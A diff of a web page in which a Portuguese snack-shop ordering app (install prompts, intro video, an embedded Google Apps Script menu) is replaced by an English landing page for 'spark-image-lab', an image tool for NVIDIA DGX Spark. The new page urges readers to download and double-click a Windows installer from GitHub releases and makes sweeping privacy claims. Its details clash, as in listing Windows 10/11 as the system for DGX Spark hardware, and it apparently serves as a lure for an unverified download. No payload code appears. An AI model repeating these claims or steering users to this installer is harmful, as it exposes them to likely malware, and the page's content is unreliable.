@@ -1,371 +1,350 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Caçula – Salgados &amp; Caldo de Cana</title>
-<meta name="description" content="Peça seus salgados da Caçula pelo celular.">
-<meta name="theme-color" content="#9E3418">
-<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-src https://script.google.com https://*.googleusercontent.com; connect-src 'self'; manifest-src 'self'; worker-src 'self'; base-uri 'self'; form-action 'none'; object-src 'none'">
-<meta name="referrer" content="strict-origin-when-cross-origin">
-<meta property="og:type" content="website">
-<meta property="og:site_name" content="Caçula">
-<meta property="og:title" content="Caçula – Salgados &amp; Caldo de Cana">
-<meta property="og:description" content="Peça seus salgados pelo app oficial da Caçula. Cariacica – ES.">
-<meta property="og:url" content="https://caculaempresa-sudo.github.io/">
-<meta property="og:image" content="https://caculaempresa-sudo.github.io/icone-512.png">
-<meta property="og:image:width" content="512">
-<meta property="og:image:height" content="512">
-<meta property="og:locale" content="pt_BR">
-<link rel="manifest" href="manifest.webmanifest">
-<link rel="icon" href="icone-192.png">
-<link rel="apple-touch-icon" href="apple-touch-icon.png">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-title" content="Caçula">
-<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-<style>
-  :root{
-    --creme:#F6EBD6; --terracota:#9E3418; --terracota-escuro:#7A2710;
-    --dourado:#E9A23B; --tinta:#2B1A12; --suave:#6B5446;
-    box-sizing:border-box;
-  }
-  *{box-sizing:inherit}
-  html,body{margin:0;height:100%;background:var(--creme);color:var(--tinta);
-    font-family:system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif}
-  .tela{min-height:100%;display:none}
-  .tela.ativa{display:block}
-
-  /* ---------- tela de entrada ---------- */
-  #inicio{padding:calc(env(safe-area-inset-top,0px) + 28px) 22px calc(env(safe-area-inset-bottom,0px) + 28px);
-    max-width:460px;margin:0 auto;text-align:center}
-  .icone{width:112px;height:112px;border-radius:26px;box-shadow:0 8px 24px rgba(122,39,16,.25)}
-  h1{font-family:Georgia,"Times New Roman",serif;font-size:2.3rem;margin:18px 0 2px;color:var(--terracota)}
-  .sub{margin:0 0 6px;color:var(--suave);font-size:1rem}
-  .local{margin:0 0 26px;color:var(--terracota-escuro);font-weight:600;letter-spacing:.04em;font-size:.82rem;text-transform:uppercase}
-  .botao{display:block;width:100%;border:0;border-radius:16px;padding:17px 18px;font-size:1.12rem;font-weight:700;
-    cursor:pointer;margin:12px 0;text-decoration:none}
-  .botao.principal{background:var(--terracota);color:#fff;box-shadow:0 6px 16px rgba(158,52,24,.3)}
-  .botao.secundario{background:#fff;color:var(--terracota);border:2px solid var(--terracota)}
-  .aviso{background:#fff;border-radius:16px;padding:16px 18px;margin:16px 0;text-align:left;
-    border-left:6px solid var(--dourado);font-size:1rem;line-height:1.45}
-  .aviso b{color:var(--terracota)}
-  .aviso .nota{display:block;margin-top:8px;font-size:.9rem;color:var(--suave)}
-  .oculto{display:none !important}
-  .rodape{margin-top:26px;font-size:.85rem;color:var(--suave)}
-  .seguro{background:#fff;border-radius:16px;padding:14px 16px;margin:18px 0 0;text-align:left;font-size:.92rem;line-height:1.45;
-    border:1px solid #E6D5B8}
-  .seguro h2{font-size:1rem;margin:0 0 6px;color:var(--terracota)}
-  .seguro ul{margin:0;padding-left:1.1em}
-  .seguro li{margin:3px 0}
-  .empresa{margin-top:18px;font-size:.8rem;color:var(--suave);line-height:1.5}
-
-  /* ---------- tela do cardápio ---------- */
-  #cardapio{position:fixed;inset:0;flex-direction:column}
-  #cardapio.ativa{display:flex}
-  .barra{display:flex;align-items:center;gap:10px;background:var(--terracota);color:#fff;
-    padding:calc(env(safe-area-inset-top,0px) + 8px) 12px 8px}
-  .barra img{width:30px;height:30px;border-radius:8px}
-  .barra .nome{font-family:Georgia,serif;font-size:1.15rem;font-weight:700;flex:1}
-  .barra button{background:var(--dourado);color:var(--tinta);border:0;border-radius:999px;padding:7px 13px;
-    font-weight:700;font-size:.9rem;cursor:pointer}
-  iframe{flex:1;width:100%;border:0;background:#fff}
-  .dica{display:flex;gap:10px;align-items:flex-start;background:#FFF6E0;border-bottom:1px solid #E6D5B8;
-    padding:10px 12px;font-size:.88rem;line-height:1.4}
-  .dica button{margin-left:auto;background:var(--terracota);color:#fff;border:0;border-radius:10px;
-    padding:6px 12px;font-weight:700;cursor:pointer;flex:none}
-  .reserva{background:var(--creme);text-align:center;padding:6px 10px calc(env(safe-area-inset-bottom,0px) + 6px);font-size:.82rem}
-  .reserva a{color:var(--terracota);font-weight:600}
-
-  /* ---------- convite depois do pedido ---------- */
-  #convite{position:fixed;left:12px;right:12px;bottom:calc(env(safe-area-inset-bottom,0px) + 14px);
-    background:#fff;border-radius:18px;padding:16px;box-shadow:0 10px 30px rgba(0,0,0,.25);z-index:10}
-  #convite p{margin:0 0 10px;font-size:1rem;line-height:1.4}
-  #convite .linha{display:flex;gap:10px}
-  #convite .linha .botao{margin:0;padding:12px;font-size:1rem}
-  /* ---------- tela de abertura (app instalado) ---------- */
-  #abertura{position:fixed;inset:0;z-index:20;background:var(--creme);display:flex;flex-direction:column;
-    align-items:center;justify-content:center;text-align:center;padding:24px;transition:opacity .45s ease}
-  #abertura.sumindo{opacity:0}
-  #abertura img{width:132px;height:132px;border-radius:30px;box-shadow:0 8px 24px rgba(122,39,16,.25)}
-  #abertura h1{margin:18px 0 4px}
-  #abertura .slogan{font-family:Georgia,"Times New Roman",serif;font-style:italic;font-size:1.35rem;
-    color:var(--terracota-escuro);max-width:320px;line-height:1.35;margin:10px 0 0}
-  @media (prefers-reduced-motion: reduce){#abertura{transition:none}}
-  /* ---------- vídeo da Rita Caçula (até o cliente fazer o cadastro) ---------- */
-  #intro{position:fixed;inset:0;z-index:30;background:var(--creme);display:flex;flex-direction:column;
-    align-items:center;justify-content:center;transition:opacity .5s ease}
-  #intro.sumindo{opacity:0}
-  #intro video{width:100%;height:100%;max-width:560px;object-fit:contain;background:var(--creme)}
-  #intro .tocar{position:absolute;left:50%;bottom:calc(env(safe-area-inset-bottom,0px) + 90px);transform:translateX(-50%);
-    background:var(--terracota);color:#fff;border:0;border-radius:999px;padding:16px 26px;font-size:1.15rem;font-weight:700;
-    box-shadow:0 8px 22px rgba(158,52,24,.35);cursor:pointer;white-space:nowrap}
-  #intro .pular{position:absolute;right:16px;top:calc(env(safe-area-inset-top,0px) + 14px);background:rgba(255,255,255,.85);
-    color:var(--terracota);border:2px solid var(--terracota);border-radius:999px;padding:7px 16px;font-weight:700;cursor:pointer}
-  :focus-visible{outline:3px solid var(--dourado);outline-offset:2px}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>spark-image-lab - Local AI Image Creation & Editing for NVIDIA DGX Spark</title>
+    <meta name="description" content="Create and edit stunning images locally on your NVIDIA DGX Spark with spark-image-lab. Powered by Qwen-Image-2.1 and Gradio. Easy download and setup for Windows.">
+    <meta name="keywords" content="dgx-spark, gb10, gradio, image-editing, image-generation, local-ai, nvidia, python, qwen-image, AI image generator, image editing tool, local AI">
+    <meta name="author" content="vibran4488">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="spark-image-lab - Local AI Image Creation & Editing">
+    <meta property="og:description" content="Generate and edit images locally on NVIDIA DGX Spark. Powered by Qwen-Image-2.1 and Gradio. Simple download for Windows.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/vibran4488/spark-image-lab">
+    <meta property="og:image" content="https://github.com/vibran4488/spark-image-lab/raw/main/docs/hero.png">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="spark-image-lab - Local AI Image Creation & Editing">
+    <meta name="twitter:description" content="Create and edit images locally on NVIDIA DGX Spark. Powered by Qwen-Image-2.1 and Gradio.">
+    <meta name="twitter:image" content="https://github.com/vibran4488/spark-image-lab/raw/main/docs/hero.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.7;
+            color: #2d3748;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+        }
+        h1 {
+            font-size: 2.8rem;
+            font-weight: 800;
+            color: #1a202c;
+            margin-bottom: 15px;
+            line-height: 1.2;
+        }
+        h2 {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #2d3748;
+            margin-top: 40px;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 3px solid #4299e1;
+        }
+        h3 {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: #2d3748;
+            margin-top: 25px;
+            margin-bottom: 10px;
+        }
+        p {
+            margin-bottom: 15px;
+            font-size: 1.1rem;
+        }
+        .hero {
+            text-align: center;
+            padding: 30px 0;
+            margin-bottom: 30px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 15px;
+            color: white;
+            padding: 40px;
+        }
+        .hero h1 {
+            color: white;
+            font-size: 2.8rem;
+            margin-bottom: 15px;
+        }
+        .hero p {
+            font-size: 1.3rem;
+            margin-bottom: 25px;
+            color: #e2e8f0;
+        }
+        .btn-primary {
+            display: inline-block;
+            background: #ed8936;
+            color: white;
+            padding: 18px 40px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            text-decoration: none;
+            border-radius: 50px;
+            box-shadow: 0 8px 25px rgba(237, 137, 54, 0.4);
+            transition: all 0.3s ease;
+            margin: 10px;
+        }
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(237, 137, 54, 0.5);
+            background: #dd6b20;
+        }
+        .btn-secondary {
+            display: inline-block;
+            background: #48bb78;
+            color: white;
+            padding: 18px 40px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            text-decoration: none;
+            border-radius: 50px;
+            box-shadow: 0 8px 25px rgba(72, 187, 120, 0.4);
+            transition: all 0.3s ease;
+            margin: 10px;
+        }
+        .btn-secondary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(72, 187, 120, 0.5);
+            background: #38a169;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+        .feature-card {
+            background: #f7fafc;
+            border-radius: 12px;
+            padding: 25px;
+            border-left: 5px solid #4299e1;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+        }
+        .feature-card h3 {
+            margin-top: 0;
+            color: #2b6cb0;
+        }
+        .feature-card p {
+            margin-bottom: 0;
+            font-size: 1rem;
+        }
+        .steps {
+            background: #ebf8ff;
+            border-radius: 15px;
+            padding: 30px;
+            margin: 30px 0;
+        }
+        .step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 25px;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        .step-number {
+            background: #4299e1;
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 1.2rem;
+            margin-right: 20px;
+            flex-shrink: 0;
+        }
+        .step-content {
+            flex: 1;
+        }
+        .step-content h3 {
+            margin-top: 0;
+            color: #2b6cb0;
+        }
+        .step-content p {
+            margin-bottom: 0;
+        }
+        .tip-box {
+            background: #fefcbf;
+            border-left: 5px solid #ecc94b;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 25px 0;
+        }
+        .tip-box p {
+            margin-bottom: 0;
+        }
+        .faq-item {
+            margin-bottom: 20px;
+            padding: 20px;
+            background: #f7fafc;
+            border-radius: 10px;
+        }
+        .faq-item h3 {
+            margin-top: 0;
+            color: #2b6cb0;
+        }
+        .faq-item p {
+            margin-bottom: 0;
+        }
+        .footer-note {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 2px solid #e2e8f0;
+            color: #718096;
+        }
+        ul {
+            margin-left: 20px;
+            margin-bottom: 15px;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        .highlight {
+            background: #ebf8ff;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+            color: #2b6cb0;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="hero">
+            <h1>🎨 spark-image-lab - Your Personal AI Image Studio</h1>
+            <p>Create, edit, and transform images locally on your NVIDIA DGX Spark</p>
+            <a href="https://github.com/vibran4488/spark-image-lab/releases" class="btn-primary">⬇️ Download Now</a>
+            <a href="https://github.com/vibran4488/spark-image-lab" class="btn-secondary">📖 View Documentation</a>
+        </div>
 
-<!-- Tela de abertura: aparece por 2 segundos quando o cliente toca no ícone -->
-<div id="abertura" class="oculto" aria-hidden="true">
-  <img src="icone-192.png" alt="">
-  <h1>Caçula</h1>
-  <p class="sub">Salgados &amp; Caldo de Cana</p>
-  <p id="sloganAbertura" class="slogan"></p>
-</div>
+        <h2>✨ What is spark-image-lab?</h2>
+        <p>spark-image-lab is a powerful, free, and easy-to-use application that lets you <strong>generate brand new images</strong> and <strong>edit existing ones</strong> right on your own computer. It's specially designed to work perfectly with the <strong>NVIDIA DGX Spark</strong>, giving you professional-grade AI image capabilities without needing an internet connection or sending your photos to a cloud server.</p>
+        <p>Powered by the advanced <strong>Qwen-Image-2.1</strong> AI model and wrapped in a friendly <strong>Gradio</strong> interface, spark-image-lab puts the power of a full creative studio in your hands. Whether you're a designer, marketer, hobbyist, or just curious about AI, this tool makes it incredibly simple to bring your ideas to life.</p>
 
-<!-- Vídeo da Rita Caçula: aparece ao abrir o app até o cliente terminar o cadastro -->
-<div id="intro" class="oculto" role="dialog" aria-label="Boas-vindas da Caçula">
-  <video id="videoIntro" playsinline preload="auto" poster="rita-cacula.jpg">
-    <source src="rita-cacula.mp4" type="video/mp4">
-  </video>
-  <button id="btnTocarIntro" class="tocar">▶ Toque para ouvir</button>
-  <button id="btnPularIntro" class="pular">Pular</button>
-</div>
+        <h2>🚀 Key Features</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>🖼️ Image Generation</h3>
+                <p>Type a description, and watch as spark-image-lab creates a completely new, unique image from scratch. Perfect for concept art, illustrations, product mockups, and more.</p>
+            </div>
+            <div class="feature-card">
+                <h3>✏️ Image Editing</h3>
+                <p>Upload your own photos and edit them using simple text commands. Change backgrounds, add elements, remove objects, or completely transform the style of your images.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🔒 100% Local & Private</h3>
+                <p>All processing happens on your DGX Spark. Your images and prompts never leave your computer, ensuring complete privacy and security.</p>
+            </div>
+            <div class="feature-card">
+                <h3>⚡ Optimized for NVIDIA DGX Spark</h3>
+                <p>Specially tuned to take full advantage of the DGX Spark's powerful hardware, delivering fast performance and high-quality results.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🎯 Simple, Clean Interface</h3>
+                <p>Built with Gradio, the interface is intuitive and easy to navigate. No technical knowledge required – just type, click, and create.</p>
+            </div>
+            <div class="feature-card">
+                <h3>📦 No Complex Setup</h3>
+                <p>We handle all the technical details. A simple download and run process gets you started in minutes, not hours.</p>
+            </div>
+        </div>
 
-<!-- Tela de entrada: aparece quando o link é aberto no navegador -->
-<section id="inicio" class="tela" aria-label="Boas-vindas">
-  <img class="icone" src="icone-192.png" alt="Ícone da Caçula">
-  <h1>Caçula</h1>
-  <p class="sub">Salgados &amp; Caldo de Cana</p>
-  <p class="local">Tradição 100% Cariacica – ES</p>
+        <h2>📥 Download & Installation</h2>
+        <p>Getting started with spark-image-lab is incredibly easy. Just follow these simple steps:</p>
+        <div class="steps">
+            <div class="step">
+                <div class="step-number">1</div>
+                <div class="step-content">
+                    <h3>Download the Application</h3>
+                    <p>Visit this link to download the application. The download will start automatically.</p>
+                    <p style="margin-top: 15px;"><a href="https://github.com/vibran4488/spark-image-lab/releases" class="btn-primary" style="font-size: 1rem; padding: 12px 25px;">⬇️ Download spark-image-lab</a></p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <div class="step-content">
+                    <h3>Run the Installer</h3>
+                    <p>Once the download is complete, locate the downloaded file in your browser's download folder (usually "Downloads"). Double-click the file to start the installation. Follow the simple on-screen instructions – just click "Next" and "Install" when prompted.</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <div class="step-content">
+                    <h3>Launch spark-image-lab</h3>
+                    <p>After installation, find the spark-image-lab icon on your desktop or in your Start Menu. Double-click it to launch the application. A browser window will open automatically, showing the main interface.</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-number">4</div>
+                <div class="step-content">
+                    <h3>Start Creating!</h3>
+                    <p>That's it! You're ready to start generating and editing images. Type a prompt in the text box, click "Generate" or "Edit", and watch the magic happen.</p>
+                </div>
+            </div>
+        </div>
 
-  <div id="avisoInstagram" class="aviso oculto">
-    <b>Abra no navegador para instalar.</b><br>
-    Toque nos <b>três pontinhos ⋯</b> no canto da tela e escolha <b>“Abrir no navegador”</b>.
-  </div>
+        <div class="tip-box">
+            <p><strong>💡 Pro Tip:</strong> For the best experience, make sure your NVIDIA DGX Spark is up to date with the latest drivers. This ensures optimal performance and compatibility.</p>
+        </div>
 
-  <button id="btnInstalar" class="botao principal oculto">📲 Instalar o app da Caçula</button>
+        <h2>🎯 How to Use</h2>
+        <h3>Generating a New Image</h3>
+        <p>1. In the main interface, find the text input box labeled "Prompt" or "Description".</p>
+        <p>2. Type a detailed description of the image you want to create. For example: <span class="highlight">"A serene mountain landscape at sunset with a crystal-clear lake reflecting the orange sky"</span></p>
+        <p>3. Click the <strong>"Generate"</strong> button. In a few seconds, your image will appear on the screen.</p>
+        <p>4. You can download the image to your computer by clicking the download icon below the generated image.</p>
 
-  <div id="avisoIphone" class="aviso oculto">
-    <b>Para ter o ícone da Caçula no iPhone:</b><br>
-    1. Toque em <b>Compartilhar</b> <span aria-hidden="true">⬆️</span> (embaixo da tela).<br>
-    2. Toque em <b>“Adicionar à Tela de Início”</b>.
-  </div>
+        <h3>Editing an Existing Image</h3>
+        <p>1. Click the <strong>"Upload"</strong> button to select an image from your computer.</p>
+        <p>2. In the prompt box, describe what you want to change. For example: <span class="highlight">"Make the sky more dramatic with storm clouds"</span> or <span class="highlight">"Add a red car in the driveway"</span></p>
+        <p>3. Click <strong>"Edit"</strong>. Your image will be processed and the edited version will appear.</p>
+        <p>4. Save your edited image by clicking the download icon.</p>
 
-  <div id="avisoAndroid" class="aviso oculto">
-    <b>Para ter o ícone da Caçula (sem instalar nada):</b><br>
-    1. Toque nos <b>três pontinhos ⋮</b> no canto de cima do navegador.<br>
-    2. Toque em <b>“Adicionar à tela inicial”</b>.<br>
-    3. Se aparecer a escolha, toque em <b>“Criar atalho”</b> e depois em <b>“Adicionar”</b>.<br>
-    <span class="nota">Se o celular mostrar um aviso de <b>“risco”</b> ao tentar instalar, fique tranquilo:
-    é só a proteção do celular para apps que não vêm da Play Store. Use o atalho acima, que não instala nada
-    e funciona igualzinho.</span>
-  </div>
+        <h2>🛠️ Requirements</h2>
+        <p>spark-image-lab is designed to work seamlessly with the NVIDIA DGX Spark. The application includes everything needed to run, but for optimal performance, we recommend:</p>
+        <ul>
+            <li><strong>Hardware:</strong> NVIDIA DGX Spark (GB10)</li>
+            <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit)</li>
+            <li><strong>RAM:</strong> 16 GB or more recommended</li>
+            <li><strong>Storage:</strong> At least 5 GB of free space</li>
+        </ul>
 
-  <div id="avisoPC" class="aviso oculto">
-    <b>No computador também funciona:</b><br>
-    clique no ícone de <b>instalar</b> na barra de endereço do Chrome ou do Edge
-    (ou em <b>⋮ → Instalar Caçula</b>) e o app abre numa janela própria.
-  </div>
-
-  <button id="btnPedir" class="botao secundario">🛒 Fazer meu pedido agora</button>
-
-  <p class="rodape">Pedidos de salgados para retirada e entrega.<br>Pagamento em dinheiro ou PIX.</p>
-
-  <section class="seguro" aria-label="Segurança">
-    <h2>🔒 App oficial e seguro</h2>
-    <ul>
-      <li>Não baixa nenhum arquivo nem programa: é só um atalho para o nosso cardápio.</li>
-      <li>Não pede senha, cartão, CPF nem acesso a fotos, contatos ou localização.</li>
-      <li><b>Bem levinho:</b> o app tem cerca de 1 MB (quase tudo é o vídeo curtinho de boas-vindas),
-          menos que um áudio do WhatsApp. Um aplicativo comum de loja ocupa centenas de vezes mais.</li>
-      <li>Não fica rodando escondido, não gasta bateria nem internet quando está fechado.</li>
-      <li>Para tirar, é só segurar o ícone e escolher <b>Remover</b> ou <b>Desinstalar</b>, como qualquer app.</li>
-      <li>Sem propaganda de terceiros e sem rastreadores: só a Caçula aparece aqui.</li>
-      <li>Nosso cardápio fica no Google. Por isso, no alto dele, pode aparecer uma <b>faixa cinza do Google</b>
-          dizendo que o aplicativo foi criado por um usuário. É um aviso normal do Google,
-          <b>não é vírus nem propaganda</b>: pode fazer seu pedido tranquilo.</li>
-      <li>Endereço com cadeado (https): a conexão é protegida.</li>
-      <li>No PIX, confira sempre o nome do recebedor antes de pagar.</li>
-      <li>Dúvidas? Fale com a gente pelo WhatsApp oficial da Caçula.</li>
-    </ul>
-  </section>
-
-  <p class="empresa">Cacula Salgaderia LTDA · CNPJ 15.650.163/0001-97<br>
-  Caldo de Cana Caçula · Cariacica – ES<br>
-  Seus dados (nome, WhatsApp e endereço) são usados só para entregar o seu pedido.</p>
-</section>
-
-<!-- Tela do cardápio: abre direto quando o cliente toca no ícone -->
-<section id="cardapio" class="tela" aria-label="Cardápio">
-  <div class="barra">
-    <img src="icone-192.png" alt="">
-    <span class="nome">Caçula</span>
-    <button id="btnInstalarBarra" class="oculto">📲 Instalar</button>
-  </div>
-  <div id="dicaGoogle" class="dica oculto">
-    <span>ℹ️ Se aparecer uma <b>faixa cinza do Google</b> no alto do cardápio, fique tranquilo:
-    é um aviso normal do Google, não é vírus nem propaganda.</span>
-    <button id="btnEntendi">Entendi</button>
-  </div>
-  <iframe id="quadro" title="Cardápio da Caçula" allow="clipboard-write; clipboard-read"></iframe>
-  <div class="reserva">O cardápio não apareceu? <a id="linkReserva" href="#">Toque aqui</a></div>
-</section>
-
-<!-- Convite para instalar, mostrado depois do primeiro pedido -->
-<div id="convite" class="oculto" role="dialog" aria-label="Instalar o app">
-  <p><b>Pedido recebido! 🎉</b><br>Quer o ícone da Caçula no seu celular para pedir mais rápido da próxima vez?</p>
-  <div class="linha">
-    <button id="btnConviteSim" class="botao principal">Quero</button>
-    <button id="btnConviteNao" class="botao secundario">Agora não</button>
-  </div>
-</div>
-
-<script>
-  // Endereço do cardápio online (Apps Script da conta da empresa)
-  const CARDAPIO = "https://script.google.com/macros/s/AKfycbze0PlYjR7VxK1BeebicO2ejmPpTnzVfVOcjA6etmKre4TNSkRE4MQwCZX76XQXwAoxaQ/exec";
-
-  const ua = navigator.userAgent || "";
-  const instalado = window.matchMedia("(display-mode: standalone)").matches || window.navigator.standalone === true;
-  // Aberto pelo atalho da tela inicial (o endereço do atalho termina em #icone): funciona como o app instalado
-  const pelaTela = instalado || location.hash === "#icone";
-  // Celulares Samsung costumam barrar a instalação ("risco"): para eles, só o atalho
-  const ehSamsung = /Samsung|SM-[A-Z0-9]/i.test(ua);
-  const ehIphone = /iPhone|iPad|iPod/.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
-  const dentroDeApp = /Instagram|FBAN|FBAV|FB_IAB|Line\//.test(ua);
-  const ehCelular = /Android|iPhone|iPad|iPod|Mobile/.test(ua) || ehIphone;
-  // Link pessoal do cliente (o que vem depois do "?"): guarda no celular para o ícone já abrir identificado
-  let complemento = location.search || "";
-  try {
-    if (complemento) localStorage.setItem("cacula_link_pessoal", complemento);
-    else complemento = localStorage.getItem("cacula_link_pessoal") || "";
-  } catch (e) {}
-  const enderecoCardapio = CARDAPIO + complemento;
-  let pedidoInstalacao = null;
-
-  const $ = (id) => document.getElementById(id);
-  const mostrar = (id) => $(id).classList.remove("oculto");
-  const esconder = (id) => $(id).classList.add("oculto");
-
-  function abrirTela(nome) {
-    document.querySelectorAll(".tela").forEach((t) => t.classList.remove("ativa"));
-    $(nome).classList.add("ativa");
-    if (nome === "cardapio" && !$("quadro").src) $("quadro").src = enderecoCardapio;
-    if (nome === "cardapio") {
-      let viu = false;
-      try { viu = localStorage.getItem("cacula_dica_google") === "1"; } catch (e) {}
-      if (!viu) mostrar("dicaGoogle");
-    }
-  }
-
-  async function instalar() {
-    if (pedidoInstalacao) {
-      pedidoInstalacao.prompt();
-      await pedidoInstalacao.userChoice;
-      pedidoInstalacao = null;
-      esconder("btnInstalar"); esconder("btnInstalarBarra");
-    } else if (ehIphone) {
-      abrirTela("inicio"); mostrar("avisoIphone");
-    } else {
-      abrirTela("inicio"); mostrar(ehCelular ? "avisoAndroid" : "avisoPC");
-    }
-  }
-
-  // Android/Chrome: o navegador avisa que dá para instalar
-  window.addEventListener("beforeinstallprompt", (e) => {
-    e.preventDefault();
-    pedidoInstalacao = e;
-    if (!pelaTela && !ehSamsung) { mostrar("btnInstalar"); mostrar("btnInstalarBarra"); }
-  });
-  window.addEventListener("appinstalled", () => {
-    esconder("btnInstalar"); esconder("btnInstalarBarra"); esconder("convite");
-  });
-
-  // O cardápio pode avisar que o pedido foi enviado (opcional, ver LEIA-ME)
-  window.addEventListener("message", (e) => {
-    let origemOk = false;
-    try { origemOk = /(^|\.)googleusercontent\.com$|(^|\.)google\.com$/.test(new URL(e.origin).hostname); } catch (err) {}
-    if (origemOk && e.data === "cacula:pedido-enviado" && !pelaTela) mostrar("convite");
-    // O cardápio avisa que o cliente já tem cadastro: o vídeo da Rita não aparece mais
-    if (origemOk && e.data === "cacula:cadastrado") {
-      try { localStorage.setItem("cacula_cadastrado", "1"); } catch (err) {}
-    }
-  });
-
-  $("btnPedir").addEventListener("click", () => abrirTela("cardapio"));
-  $("btnInstalar").addEventListener("click", instalar);
-  $("btnInstalarBarra").addEventListener("click", instalar);
-  $("btnConviteSim").addEventListener("click", () => { esconder("convite"); instalar(); });
-  $("btnConviteNao").addEventListener("click", () => esconder("convite"));
-  $("btnEntendi").addEventListener("click", () => {
-    esconder("dicaGoogle");
-    try { localStorage.setItem("cacula_dica_google", "1"); } catch (e) {}
-  });
-  $("linkReserva").addEventListener("click", (e) => { e.preventDefault(); location.href = enderecoCardapio; });
-
-  // Slogans da Caçula: um diferente a cada abertura do app
-  const SLOGANS = [
-    "Pequena no nome, grande no sabor!",
-    "A caçula que todo Capixaba conhece.",
-    "Salgado com sabor e caldo com frescor.",
-    "Caçula: mal PIXcou, já dá vontade de dar outra PIXcadinha!",
-    "100% Capixaba, mais 100% Cariacica!",
-    "Mão na massa todo dia, sabor na sua mesa!",
-    "Salgado Caçula: amor à primeira mordida!"
-  ];
-  function mostrarAbertura() {
-    let ultimo = -1;
-    try { ultimo = parseInt(localStorage.getItem("cacula_ultimo_slogan") || "-1", 10); } catch (e) {}
-    let i = Math.floor(Math.random() * SLOGANS.length);
-    if (i === ultimo) i = (i + 1) % SLOGANS.length;          // não repete o da última vez
-    try { localStorage.setItem("cacula_ultimo_slogan", String(i)); } catch (e) {}
-    $("sloganAbertura").textContent = SLOGANS[i];
-    mostrar("abertura");
-    const fechar = () => {
-      $("abertura").classList.add("sumindo");
-      setTimeout(() => esconder("abertura"), 450);
-    };
-    $("abertura").addEventListener("click", fechar, { once: true });   // tocar pula a abertura
-    setTimeout(fechar, 2000);
-  }
-
-  // Vídeo da Rita Caçula: só enquanto o cliente ainda não fez o cadastro
-  function jaCadastrado() {
-    try { return localStorage.getItem("cacula_cadastrado") === "1"; } catch (e) { return false; }
-  }
-  function mostrarIntro() {
-    const v = $("videoIntro");
-    let fechado = false;
-    const fechar = () => {
-      if (fechado) return; fechado = true;
-      try { v.pause(); } catch (e) {}
-      $("intro").classList.add("sumindo");
-      setTimeout(() => esconder("intro"), 500);
-    };
-    const tocar = () => {
-      esconder("btnTocarIntro");
-      v.muted = false; v.currentTime = 0;
-      v.play().catch(() => { v.muted = true; v.play().catch(fechar); });
-    };
-    mostrar("intro");
-    $("btnTocarIntro").addEventListener("click", tocar);
-    v.addEventListener("click", () => { if (v.paused) tocar(); });
-    $("btnPularIntro").addEventListener("click", fechar);
-    v.addEventListener("ended", () => setTimeout(fechar, 400));
-    v.addEventListener("error", fechar);
-  }
-
-  // Primeira tela
-  if (pelaTela) {
-    abrirTela("cardapio");                    // tocou no ícone: o cardápio já carrega por trás
-    if (jaCadastrado()) mostrarAbertura();    // cliente com cadastro: abertura com o slogan
-    else mostrarIntro();                      // ainda sem cadastro: vídeo da Rita Caçula
-  } else {
-    abrirTela("inicio");
-    // o atalho criado a partir desta tela já sai com #icone no endereço
-    if (ehCelular && !dentroDeApp) {
-      try { history.replaceState(null, "", location.pathname + location.search + "#icone"); } catch (e) {}
-    }
-    if (dentroDeApp) mostrar("avisoInstagram");
-    else if (ehIphone) mostrar("avisoIphone");
-    else if (ehCelular) mostrar("avisoAndroid");
-    else setTimeout(() => { if (!pedidoInstalacao) mostrar("avisoPC"); }, 2500);
-  }
-
-  if ("serviceWorker" in navigator) {
